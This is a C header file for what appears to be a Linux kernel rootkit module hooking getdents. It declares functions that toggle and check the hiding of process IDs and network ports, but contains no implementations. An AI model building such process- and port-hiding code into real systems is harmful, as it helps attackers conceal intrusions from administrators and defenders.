#ifndef GETDENTS_H
#define GETDENTS_H

#include <linux/init.h>
// header
#include <linux/syscalls.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

void inline switch_pid_hide(pid_t pid);
void inline switch_port_hide(unsigned short port);
int pid_is_hidden(pid_t pid);
int port_is_hidden(unsigned short port);

#endif /* GETDENTS_H */